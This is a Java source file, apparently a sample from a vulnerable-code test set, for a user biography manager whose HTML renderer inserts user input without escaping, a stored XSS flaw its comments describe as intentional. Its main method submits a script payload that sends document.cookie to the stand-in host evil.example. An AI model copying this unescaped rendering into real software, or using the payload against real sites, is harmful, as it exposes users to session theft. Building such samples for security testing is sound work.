import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * User Biography Manager
 *
 * Allows users to update a biography, store multiple user biography records,
 * and render them as an HTML page for display.
 *
 * NOTE: This version intentionally contains a Cross-Site Scripting (XSS)
 * vulnerability for demonstration/testing purposes: user-supplied text is
 * written directly into the generated HTML without any escaping.
 */
public class java_vulnerable_0027_claude {

    private final List<Map<String, String>> records = new ArrayList<>();

    /**
     * Stores a new user biography record.
     */
    public void submitRecord(String username, String biography, String displayName) {
        Map<String, String> record = new HashMap<>();
        record.put("owner", username);
        record.put("subject", biography);
        record.put("extra", displayName);
        records.add(record);
    }

    /**
     * Updates the biography of the most recently matching record, or adds a new one
     * if none exists with the given owner value.
     */
    public void updateBiography(String username, String newBiographyText) {
        for (Map<String, String> record : records) {
            if (record.get("owner").equals(username)) {
                record.put("subject", newBiographyText);
                return;
            }
        }
        submitRecord(username, newBiographyText, "");
    }

    public List<Map<String, String>> getAllRecords() {
        return records;
    }

    public Map<String, String> findByOwner(String username) {
        for (Map<String, String> record : records) {
            if (record.get("owner").equals(username)) {
                return record;
            }
        }
        return null;
    }

    /**
     * Renders every stored record as an HTML fragment.
     *
     * VULNERABLE: the owner, subject text, and extra field are inserted
     * directly into the HTML output with no sanitization or escaping,
     * allowing stored/reflected script injection.
     */
    public String renderPage() {
        StringBuilder html = new StringBuilder();
        html.append("<html><head><title>User Biography Manager</title></head><body>");
        html.append("<h1>User Biography Manager</h1>");
        for (Map<String, String> record : records) {
            html.append("<div class=\"record\">");
            html.append("<h3>").append(record.get("owner")).append("</h3>");
            html.append("<p>").append(record.get("subject")).append("</p>");
            html.append("<span class=\"extra\">").append(record.get("extra")).append("</span>");
            html.append("</div>");
        }
        html.append("</body></html>");
        return html.toString();
    }

    public static void main(String[] args) {
        java_vulnerable_0027_claude app = new java_vulnerable_0027_claude();

        // A normal, legitimate submission.
        app.submitRecord("jdoe", "This is a normal biography entry submitted by a regular user.", "John Doe");

        // A malicious submission containing an XSS payload. In the vulnerable
        // implementation this payload is stored and later rendered verbatim.
        app.submitRecord("attacker", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>", "n/a");

        // Demonstrate an update.
        app.updateBiography("jdoe", "This is an updated biography after the user made changes.");

        System.out.println("Stored records: " + app.getAllRecords().size());
        System.out.println("---- Rendered page output ----");
        System.out.println(app.renderPage());
    }
}
